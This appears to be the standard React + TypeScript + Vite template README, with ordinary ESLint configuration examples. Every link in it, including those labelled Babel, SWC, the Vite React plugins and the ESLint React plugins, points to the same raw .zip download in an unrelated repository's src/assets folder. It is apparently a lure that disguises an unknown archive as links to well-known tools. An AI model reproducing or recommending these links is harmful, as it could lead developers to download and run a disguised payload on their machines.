# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) uses [Babel](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) uses [SWC](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default tseslint.config([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove tseslint.configs.recommended and replace with this
      ...tseslint.configs.recommendedTypeChecked,
      // Alternatively, use this for stricter rules
      ...tseslint.configs.strictTypeChecked,
      // Optionally, add this for stylistic rules
      ...tseslint.configs.stylisticTypeChecked,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['./tsconfig.node.json', './tsconfig.app.json'],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) and [eslint-plugin-react-dom](https://github.com/tianarsamm/FE-Website-Rentofficebwa/raw/refs/heads/main/src/assets/F_Rentofficebwa_Website_v3.6.zip) for React-specific lint rules:

```js
// eslint.config.js
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default tseslint.config([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      reactX.configs['recommended-typescript'],
      // Enable lint rules for React DOM
      reactDom.configs.recommended,
    ],
    languageOptions: {
      parserOptions: {
        project: ['./tsconfig.node.json', './tsconfig.app.json'],
        tsconfigRootDir: import.meta.dirname,
      },
      // other options...
    },
  },
])
```
